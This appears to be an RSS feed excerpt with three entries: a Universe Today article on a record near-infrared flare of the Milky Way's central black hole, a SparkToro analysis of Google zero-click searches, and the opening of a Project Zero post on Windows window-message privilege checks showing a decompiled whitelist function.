<title>Milky Way’s Black Hole Just Flared, Growing 75 Times as Bright for a Few Hours</title>

<guid isPermaLink="true" >https://www.universetoday.com/143150/milky-ways-black-hole-just-flared-growing-75-times-as-bright-for-a-few-hours/#more-143150</guid>
<description>&lt;p&gt;Even though the black hole at the center of the Milky Way is a monster, it’s still rather quiet. Called &lt;a href=&quot;https://en.wikipedia.org/wiki/Sagittarius_A*&quot;&gt;Sagittarius A*&lt;/a&gt;, it’s about 4.6 million times more massive than our Sun. Usually, it’s a brooding behemoth. But scientists observing Sgr. A* with the &lt;a href=&quot;http://www.keckobservatory.org/&quot;&gt;Keck Telescope&lt;/a&gt; just watched as its brightness bloomed to over 75 times normal for a few hours.&lt;/p&gt;
&lt;span id=&quot;more-143150&quot;/&gt;
&lt;p&gt;The flaring is not visible in optical light. It’s all happening in the near-infrared, the portion of the infrared spectrum closest to optical light. Astronomers have been watching Sgr. A* for 20 years, and though the black hole does have some variability in its output, this 75 times normal flaring event is like nothing astronomers have observed before. This peak was over twice as bright as the previous peak flux level.&lt;/p&gt;
&lt;p&gt;These results are being reported in the Astrophysical Journal Letters in a paper titled “&lt;a href=&quot;https://arxiv.org/abs/1908.01777&quot;&gt;Unprecedented variability of Sgr A* in NIR&lt;/a&gt;“, and is available at the pre-press site &lt;a href=&quot;https://arxiv.org/&quot;&gt;arXiv.org&lt;/a&gt;. The lead author is &lt;a href=&quot;http://www.astro.ucla.edu/~tdo/&quot;&gt;Tuan Do&lt;/a&gt;, an astronomer at UCLA.&lt;/p&gt;

&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Here's a timelapse of images over 2.5 hr from May from &lt;a href=&quot;https://twitter.com/keckobservatory?ref_src=twsrc%5Etfw&quot;&gt;@keckobservatory&lt;/a&gt; of the supermassive black hole Sgr A*. The black hole is always variable, but this was the brightest we've seen in the infrared so far. It was probably even brighter before we started observing that night! &lt;a href=&quot;https://t.co/MwXioZ7twV&quot;&gt;pic.twitter.com/MwXioZ7twV&lt;/a&gt;&lt;/p&gt;
— Tuan Do (@quantumpenguin) &lt;a href=&quot;https://twitter.com/quantumpenguin/status/1160368687590727680?ref_src=twsrc%5Etfw&quot;&gt;August 11, 2019&lt;/a&gt;&lt;/blockquote&gt;
&lt;/div&gt;
&lt;p&gt;The team saw Sgr. A* flaring at 75 times normal for a two-hour period on May 13th. At first, astronomer Tuan Do thought that they were seeing a star called SO-2 rather than Sgr. A*. SO-2 is one of a group of stars called S-stars that orbits the black hole closely. Astronomers have been keeping an eye on it as it orbits the black hole, and at first they weren’t sure if they were seeing it or Sgr. A*.&lt;/p&gt;
&lt;p&gt;In an &lt;a href=&quot;https://www.sciencealert.com/our-galaxy-s-supermassive-black-hole-just-mysteriously-got-really-really-bright&quot;&gt;interview&lt;/a&gt; with &lt;a href=&quot;https://www.sciencealert.com/&quot;&gt;ScienceAlert&lt;/a&gt;, Do said, “The black hole was so bright I at first mistook it for the star S0-2, because I had never seen Sgr A* that bright. Over the next few frames, though, it was clear the source was variable and had to be the black hole. I knew almost right away there was probably something interesting going on with the black hole.”&lt;/p&gt;
&lt;img src=&quot;https://www.universetoday.com/wp-content/uploads/2019/08/Sgr-A-star-flare.png&quot; alt=&quot;Four images from the paper. Over about a 2 hour period, Sgr A* flared to 75 times normal, and twice as bright as any other observed peak. At first, astronomers thought they were looking at the S star SO-2. Image Credit: Do et al; 2019.&quot; class=&quot;wp-image-143153&quot; srcset=&quot;https://www.universetoday.com/wp-content/uploads/2019/08/Sgr-A-star-flare.png 558w, https://www.universetoday.com/wp-content/uploads/2019/08/Sgr-A-star-flare-250x64.png 250w&quot; sizes=&quot;(max-width: 558px) 100vw, 558px&quot;/&gt;Four images from the paper.

&lt;p&gt;The question is, what made Sgr. A* flare like this?&lt;/p&gt;
&lt;div class=&quot;unive-in-content&quot; id=&quot;unive-1204298164&quot;&gt;&lt;ins class=&quot;adsbygoogle&quot; data-ad-client=&quot;ca-pub-0569369285898441&quot; data-ad-slot=&quot;6976973445&quot;/&gt; &lt;/div&gt;
&lt;p&gt;At this point, astronomers aren’t certain what caused the flaring. Sgr. A* has exhibited flaring before, just not as brightly. So flaring itself isn’t unprecedented.&lt;/p&gt;
&lt;img src=&quot;https://www.universetoday.com/wp-content/uploads/2019/04/eso1907a-1024x597.jpg&quot; alt=&quot;This is our best-yet image of an actual black hole. It's the super-massive black hole at the center of galaxy M87, and it was captured by the Event Horizon Telescope (EHT). The black hole itself can't actually be seen so this image is actually of its event horizon. The EHT's next target is Sgr. A*.

&lt;p&gt;It’s likely that something has disrupted Sgr. A*’s usually quiet neighborhood, and there are at least a couple possibilities. The first is not actually a disruption, but an inaccuracy in the statistical models used to understand the black hole. If that’s the case, then the model needs to be updated to include these variations as “normal” for Sgr. A*.&lt;/p&gt;
&lt;p&gt;The second possibility is where things get interesting: something has changed in the black hole’s neighborhood.&lt;/p&gt;
&lt;div class=&quot;unive-in-content&quot; id=&quot;unive-978780402&quot;&gt;&lt;ins class=&quot;adsbygoogle&quot; data-ad-client=&quot;ca-pub-0569369285898441&quot; data-ad-slot=&quot;6976973445&quot;/&gt; &lt;/div&gt;
&lt;p&gt;The previously-mentioned star named SO-2 is a prime candidate. It’s one of two stars that approach very close to Sgr. A* in an elliptical orbit. Every 16 years it’s at its closest. Back in the middle of 2018 was its last closest approach, when it was only 17 light hours away from the black hole.&lt;/p&gt;
&lt;img src=&quot;https://www.universetoday.com/wp-content/uploads/2019/08/S-stars.png&quot; alt=&quot;The group of stars that orbit close to Sgr. A* are called S stars. S2 made it's closest approach about a year before the flaring observed in May 2019.

&lt;p&gt;It’s possible that SO-2’s close approach disrupted the way that material flows into Sgr. A*. That would generate the kind of variability and bright flaring that astronomers saw in May, about one year after the star’s close approach.&lt;/p&gt;
&lt;p&gt;But astronomers aren’t certain. SO-2 is not a very large star, and it seems unlikely that it could cause this type of disruption. Not only that, but it’s the largest of the S stars that get close to Sgr. A*, so it’s unlikely that one of the other star’s could be the cause, either.&lt;/p&gt;
&lt;div class=&quot;unive-in-content&quot; id=&quot;unive-1883146257&quot;&gt;&lt;ins class=&quot;adsbygoogle&quot; data-ad-client=&quot;ca-pub-0569369285898441&quot; data-ad-slot=&quot;6976973445&quot;/&gt; &lt;/div&gt;
&lt;p&gt;Another possibility is a gas cloud.&lt;/p&gt;
&lt;p&gt;Back in 2002, astronomers saw what they thought might be a hydrogen gas cloud approaching the center of Sgr. A*. By 2012, astronomers were more certain that it was a cloud, and it was named G2. They measured the temperature of the cloud at 10,000 degrees Kelvin, and they were able to measure its trajectory: in 2013, it would travel close enough to the black hole that the tidal forces would &lt;a href=&quot;https://www.universetoday.com/107899/gas-cloud-or-star-mystery-object-heading-towards-our-galaxys-supermassive-black-hole-is-doomed/&quot;&gt;tear it apart&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&quot;wp-block-embed__wrapper&quot;&gt;&lt;span class=&quot;embed-youtube&quot;&gt;&lt;iframe class=&quot;youtube-player&quot; type=&quot;text/html&quot; width=&quot;525&quot; height=&quot;296&quot; src=&quot;https://www.youtube.com/embed/cpKqZxdP5j4?version=3&amp;amp;rel=1&amp;amp;fs=1&amp;amp;autohide=2&amp;amp;showsearch=0&amp;amp;showinfo=1&amp;amp;iv_load_policy=1&amp;amp;wmode=transparent&quot; allowfullscreen=&quot;true&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/span&gt;&lt;/div&gt;
The European Southern Observatory made this simulation of G2 being ripped apart by Sgr. A*. Credit: ESO
&lt;p&gt;Initially, astronomers thought that gas from &lt;a href=&quot;https://en.wikipedia.org/wiki/Sagittarius_A*#Discovery_of_G2_gas_cloud_on_an_accretion_course&quot;&gt;G2&lt;/a&gt; might be drawn into Sgr. A*’s accretion disk, and that it would flare brightly as it was heated. But that never happened.&lt;/p&gt;
&lt;div class=&quot;unive-in-content&quot; id=&quot;unive-680361677&quot;&gt;&lt;ins class=&quot;adsbygoogle&quot; data-ad-client=&quot;ca-pub-0569369285898441&quot; data-ad-slot=&quot;6976973445&quot;/&gt; &lt;/div&gt;
&lt;p&gt;But it’s still possible that its passage close to the black hole set off a chain of events that caused or contributed to the May 2019 flaring.&lt;/p&gt;
&lt;img src=&quot;https://www.universetoday.com/wp-content/uploads/2019/08/25283_g2Big-1024x576.jpg&quot; alt=&quot;A computer-simulated image of the hydrogen gas cloud G2 encountering Sgr. A* and being stretched out. The encounter could have disrupted the usually sedate in-flow of material into the black hole and caused the variability and flaring observed in May, 2019.

Calcada/ European Southern Observatory and Max-Planck-Institut fur Extraterrestrische Physik. &quot; class=&quot;wp-image-143160&quot; srcset=&quot;https://www.universetoday.com/wp-content/uploads/2019/08/25283_g2Big-1024x576.jpg 1024w, https://www.universetoday.com/wp-content/uploads/2019/08/25283_g2Big-250x141.jpg 250w, https://www.universetoday.com/wp-content/uploads/2019/08/25283_g2Big-580x326.jpg 580w, https://www.universetoday.com/wp-content/uploads/2019/08/25283_g2Big-768x432.jpg 768w, https://www.universetoday.com/wp-content/uploads/2019/08/25283_g2Big.jpg 1280w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;A computer-simulated image of the hydrogen gas cloud G2 encountering Sgr.

Image Credit: M. Schartmann and L. Calcada/ European Southern Observatory and Max-Planck-Institut fur Extraterrestrische Physik.
&lt;p&gt;In the final analysis, (if there ever is one in science) this flaring may just be the natural result of a variable flow of material into Sgr. A*, which is expected to be lumpy. If that’s the case, then we’re back to just updating the statistical model used to explain the black hole’s variability.&lt;/p&gt;
&lt;p&gt;The only way to know is to gather more data. Not only with the Keck, while the galactic center is still visible at night, but with other telescopes. During the last few months, the galactic center has been visible, and ‘scopes like the Spitzer, Chandra, Swift, and ALMA have been watching. These observations across multiple wavelengths should help clarify the situation when they’re made available.&lt;/p&gt;

<description>&lt;p&gt;We’ve passed a milestone in Google’s evolution from search engine to walled-garden. In June of 2019, for the first time, a majority of all browser-based searches on Google.com resulted in zero-clicks.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;a href=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Paid-Organic-Zero-Click-June-2019.png&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot;&gt;&lt;img src=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Paid-Organic-Zero-Click-June-2019-1024x576.png&quot; alt=&quot;Pie Chart of Paid, Organic, &amp;amp; Zero-Click Searches in Google (June 2019)&quot; class=&quot;wp-image-4092&quot; srcset=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Paid-Organic-Zero-Click-June-2019-1024x576.png 1024w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Paid-Organic-Zero-Click-June-2019-300x169.png 300w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Paid-Organic-Zero-Click-June-2019-768x432.png 768w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Paid-Organic-Zero-Click-June-2019.png 1280w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;Throughout this post, I’ll be using numbers from the clickstream data company, &lt;a href=&quot;https://www.jumpshot.com/&quot;&gt;Jumpshot&lt;/a&gt;. They are, in my opinion, the best, most reliable source of information on what happens inside web browsers because of how they gather, process, and scale their estimates. That’s why SparkToro, and Moz (my previous company) are both customers of Jumpshot. Given all the nice things I say about them, it might sound like they’re paying me, but the opposite is true; we’re paying them. You can find more on their methodology in the endnote on this post.&lt;/p&gt;
&lt;p&gt;Let’s go back, for a moment, to July 23rd, 2019. After a United States Congressional panel asked Adam Cohen, Google’s representative, direct questions about Google’s activities (&lt;a href=&quot;https://youtu.be/iZ0LduMwZec?t=1797&quot;&gt;video link&lt;/a&gt;) and found his responses… lacking… the Chairman of the committee, David Cicilline (of Rhode Island), sent this extraordinarily clear request (&lt;a href=&quot;https://cicilline.house.gov/sites/cicilline.house.gov/files/7.23.2019_ACAL%20Company%20Clarification%20Requests.pdf&quot;&gt;full PDF here&lt;/a&gt;):&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/cicilline-google-question.gif&quot; alt=&quot;&quot; class=&quot;wp-image-4090&quot;/&gt;&lt;/div&gt;
&lt;p&gt;I love the clarity of this format. The Congressman makes it known that while Google is welcome to attach more information, they must check a yes/no box. Let’s see how Google responds…&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/cicilline-google-response.gif&quot; alt=&quot;&quot; class=&quot;wp-image-4091&quot;/&gt;&lt;/div&gt;
&lt;p&gt;Sigh… Maybe I need to stop being disappointed in Google and just start expecting them to lie, mislead, and refuse direct questions. I know a lot of wonderful people who work at Google, and I know at least a handful of them who are less than thrilled by how their peers represented the company here.&lt;/p&gt;
&lt;p&gt;But, since Google won’t give clear answers, I’ll let Jumpshot’s data do it for them. Below is a visual showing where searches happened on mobile and desktop browsers in April, May, and June of 2019 (Q2):&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;a href=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Where-searchers-click-q2-2019.png&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot;&gt;&lt;img src=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Where-searchers-click-q2-2019-1024x576.png&quot; alt=&quot;&quot; class=&quot;wp-image-4093&quot; srcset=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Where-searchers-click-q2-2019-1024x576.png 1024w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Where-searchers-click-q2-2019-300x169.png 300w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Where-searchers-click-q2-2019-768x432.png 768w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Where-searchers-click-q2-2019.png 1280w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;June (as shown at the top of this post) is when zero-click searches in browsers passed 50%, but the pie chart above shows that even before that, Google was sending a huge portion of search clicks to their own properties (~6% of queries and ~12% of clicks). Those properties include YouTube, Maps, Android, Google’s blog, subdomains of Google.com, and a dozen or so others (full list &lt;a href=&quot;https://sparktoro.com/blog/how-much-of-googles-search-traffic-is-left-for-anyone-but-themselves/&quot;&gt;here&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Maybe Google’s websites are ranking exclusively because they’re the best result, but if Congress is asking questions about whether a monopoly is potentially abusing its market dominance in one field to unfairly compete in another, I’ve got something else they’ll want to see. It’s a chart of where searches happened on major web properties in Q2, and as you can see, there’s no competition.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;a href=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/search-engine-market-share-q2-2019.png&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot;&gt;&lt;img src=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/search-engine-market-share-q2-2019-1024x576.png&quot; alt=&quot;&quot; class=&quot;wp-image-4094&quot; srcset=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/search-engine-market-share-q2-2019-1024x576.png 1024w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/search-engine-market-share-q2-2019-300x169.png 300w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/search-engine-market-share-q2-2019-768x432.png 768w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/search-engine-market-share-q2-2019.png 1280w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;Google is almost certainly even more dominant than the chart above suggests. That’s because mobile apps, which Jumpshot doesn’t currently measure, aren’t included — this is just browser-based search data. The Google Maps App, Google Search App, and YouTube are &lt;a href=&quot;https://www.similarweb.com/apps/top/google/app-index/us/all/top-free&quot;&gt;installed&lt;/a&gt; on almost every mobile device in the US, and likely have so much usage that, if their search statistics were included, Google’s true market share would be 97%+.&lt;/p&gt;
&lt;p&gt;That makes them a clear monopoly in search. And a lot of folks think it’s somewhere between odd and suspicious how well Google’s features and properties have done over time.&lt;/p&gt;
&lt;blockquote align=&quot;center&quot; class=&quot;twitter-tweet&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Google is such a great company, they’ve never been hurt by a major algorithm update 📈&lt;/p&gt;&lt;p&gt;Maps, YouTube, Fights, Shopping, and more win almost every time. (And the Ads department is on 🔥)&lt;/p&gt;&lt;p&gt;A testiment to their great content, really.&lt;/p&gt;

&lt;p&gt;Next, let’s look at how these clickthrough rates have changed over time.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;a href=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-search-CTR-2016-2019.png&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot;&gt;&lt;img src=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-search-CTR-2016-2019-1024x576.png&quot; alt=&quot;&quot; class=&quot;wp-image-4096&quot; srcset=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-search-CTR-2016-2019-1024x576.png 1024w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-search-CTR-2016-2019-300x169.png 300w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-search-CTR-2016-2019-768x432.png 768w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-search-CTR-2016-2019.png 1280w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;We can see a consistent pattern: organic shrinks while zero-click searches and paid CTR rise. But the devil’s in the details and, in this case, mostly the mobile details, where Google’s gotten more aggressive with how ads and instant answer-type features appear.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;a href=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-mobile-ctr-2016-2019.png&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot;&gt;&lt;img src=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-mobile-ctr-2016-2019-1024x576.png&quot; alt=&quot;&quot; class=&quot;wp-image-4097&quot; srcset=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-mobile-ctr-2016-2019-1024x576.png 1024w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-mobile-ctr-2016-2019-300x169.png 300w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-mobile-ctr-2016-2019-768x432.png 768w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-mobile-ctr-2016-2019.png 1280w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;Above is the distribution of search clicks across the millions of mobile devices in Jumpshot’s panel. Below is that same distribution for millions of desktop devices.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;a href=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-desktop-ctr-2016-2019.png&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot;&gt;&lt;img src=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-desktop-ctr-2016-2019-1024x576.png&quot; alt=&quot;&quot; class=&quot;wp-image-4098&quot; srcset=&quot;https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-desktop-ctr-2016-2019-1024x576.png 1024w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-desktop-ctr-2016-2019-300x169.png 300w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-desktop-ctr-2016-2019-768x432.png 768w, https://images.sparktoro.com/blog/wp-content/uploads/2019/08/Google-desktop-ctr-2016-2019.png 1280w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;On desktop, things haven’t changed all that much in the last three years. Organic is down a few percent, paid and zero-click are up a bit, but June of 2019 isn’t far off January of 2016.&lt;/p&gt;
&lt;p&gt;On mobile, where more than half of all searches take place, it’s a different story. Organic has fallen by almost 20%, while paid has nearly tripled and zero-click searches are up significantly. Even way back in January 2016, more than half of mobile searches ended without a click. Today’s, it’s almost 2/3rds.&lt;/p&gt;
&lt;p&gt;Three trends are made clear by these numbers:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;The percent of searches available as organic traffic from Google is steadily declining, especially on mobile.&lt;/li&gt;
&lt;li&gt;Paid clicks tend to increase whenever Google makes changes to how those results are displayed, then slowly decline as searchers get more familiar with spotting and avoiding them.&lt;/li&gt;
&lt;li&gt;Google’s ongoing attempts to answer more searches without a click to any results OR a click to Google’s own properties are both proving successful. As a result, zero-click searches, and clicks that bring searchers to a Google-owned site keep rising.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;What’s a smart marketer, entrepreneur, or web creator to do?&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Find ways to get value from zero-click searches&lt;/li&gt;
&lt;li&gt;Seek out keywords whose results have higher CTR opportunity&lt;/li&gt;
&lt;li&gt;Get your content optimized on Google’s own properties (YouTube, Maps, Images, AMP, Knowledge Panels, etc.)&lt;/li&gt;
&lt;li&gt;Hope that the recently opened investigations into Google’s anti-competitive behavior yield results (either findings that this behavior isn’t anti-competitive, or consequences that return market opportunity)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Methodology Notes:&lt;/strong&gt;&lt;br/&gt;&lt;a href=&quot;https://www.jumpshot.com/&quot;&gt;Jumpshot&lt;/a&gt; is the data arm of &lt;a href=&quot;https://www.avast.com/&quot;&gt;Avast&lt;/a&gt;, a well-regarded maker of numerous Internet security products. This suite of products, in order to function, must collect and analyze every URL visited by every browser of every machine on which its installed. That includes millions of Android-powered devices and millions of PCs as well. They have much lower coverage on iOS devices and so don’t report on visit data from those browsers.&lt;/p&gt;
&lt;p&gt;Because Avast has to see and process all these URLs anyway (in order to serve their function of providing web security), they anonymize, aggregate, and remove any personally-identifiable information from the browser URL visits and then provide them to Jumpshot, who then makes estimates about broad web usage behavior. In my opinion, this is both an ethical way to gather crucial data about what’s happening on the web, and a great way for data analysts like me to get web-scale, high-accuracy numbers.&lt;/p&gt;
&lt;p&gt;Jumpshot’s panel worldwide is over 100 million devices. In the United States alone, it’s in the many millions (though Jumpshot keeps the precise size private). By my estimates (Rand’s best guess, not Jumpshot’s) it’s somewhere between 2-6% of the total number of mobile and desktop Internet-browsing devices in the US, AKA a statistically significant sample size. Undoubtedly, this device panel has biases — perhaps iOS users (which aren’t counted) search more often on average, or click on results more often when they do search. Maybe Jumpshot’s panel of users is slightly more likely to use Google or less likely to use Bing than the average web user.&lt;/p&gt;
&lt;p&gt;But, overall, it’s likely these biases are small (a few percentage points at most). And so far, I haven’t seen evidence of any bias that suggests the way Jumpshot’s users search and click is different from the way any other group of web browsers is. If that ever changes, I’ll make sure to update this piece.&lt;/p&gt;

<title>Down the Rabbit-Hole</title>
<link>https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html</link>
<guid isPermaLink="true" >https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html</guid>
<description>&lt;div class=&quot;c3 c32 title&quot; id=&quot;h.wqb4cp1zzfq0&quot;&gt;&lt;span&gt;&lt;strong&gt;Posted by Tavis Ormandy, Security Research Over-Engineer.&lt;/strong&gt;&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c60 c25 c80&quot;&gt;&lt;span class=&quot;c83 c2&quot;&gt;“Sometimes, hacking is just someone spending more time on something than anyone else might reasonably expect.”&lt;/span&gt;&lt;sup class=&quot;c2 c83&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html#ftnt1&quot; id=&quot;ftnt_ref1&quot;&gt;[1]&lt;/a&gt;&lt;/sup&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;I often find it valuable to write simple test cases confirming things work the way I think they do. Sometimes I can’t explain the results, and getting to the bottom of those discrepancies can reveal new research opportunities. This is the story of one of those discrepancies; and the security rabbit-hole it led me down.&lt;/span&gt;&lt;/div&gt;



&lt;div class=&quot;c3&quot;&gt;Usually, windows on the same desktop can communicate with each other. They can ask each other to move, resize, close or even send each other input. This can get complicated when you have applications with&lt;span class=&quot;c0&quot;&gt; different privilege levels, for example, if you “Run as administrator”.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;It wouldn’t make sense if an unprivileged window could just send commands to a highly privileged window, and that’s what UIPI, &lt;span class=&quot;c2&quot;&gt;User Interface Privilege Isolation&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;, prevents. This isn’t a story about UIPI, but it is how it began.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;The code that verifies you’re allowed to communicate with another window is part of &lt;span class=&quot;c29&quot;&gt;win32k!NtUserPostMessage&lt;/span&gt;. The logic is simple enough, it checks if the application explicitly allowed the message, or if it’s on a whitelist of harmless messages.&lt;/div&gt;

&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c23 c31&quot;&gt;BOOL __fastcall IsMessageAlwaysAllowedAcrossIL(DWORD Message)&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c10&quot;&gt;  BOOL ReturnCode; // &lt;/span&gt;&lt;span class=&quot;c17 c33&quot;&gt;edx&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c17&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;c10&quot;&gt;BOOL IsDestroy; // &lt;/span&gt;&lt;span class=&quot;c17 c33&quot;&gt;zf&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c17&quot;&gt;  ReturnCode &lt;/span&gt;&lt;span class=&quot;c10&quot;&gt;= &lt;/span&gt;&lt;span class=&quot;c17&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;c8&quot;&gt;;&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c17&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;c10&quot;&gt;switch ( &lt;/span&gt;&lt;span class=&quot;c17&quot;&gt;Message &lt;/span&gt;&lt;span class=&quot;c8&quot;&gt;)&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;    case WM_PAINTCLIPBOARD:&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;    case WM_VSCROLLCLIPBOARD:&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;      break;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;    case WM_CHANGECBCHAIN:&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;    case WM_SYSMENU:&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;    case WM_THEMECHANGED:&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;      return 1;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;    default:&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c10&quot;&gt;      return &lt;/span&gt;&lt;span class=&quot;c17&quot;&gt;ReturnCode&lt;/span&gt;&lt;span class=&quot;c8&quot;&gt;;&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c10&quot;&gt;  return &lt;/span&gt;&lt;span class=&quot;c17&quot;&gt;ReturnCode&lt;/span&gt;&lt;span class=&quot;c8&quot;&gt;;&lt;/span&gt;&lt;/div&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c25&quot;&gt;&lt;span class=&quot;c75&quot;&gt;Snippet of &lt;/span&gt;&lt;span class=&quot;c29 c75&quot;&gt;win32k!IsMessageAlwaysAllowsAcrossIL&lt;/span&gt;&lt;span class=&quot;c62 c74&quot;&gt; showing the whitelist of allowed messages, what could be simpler.... ?&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
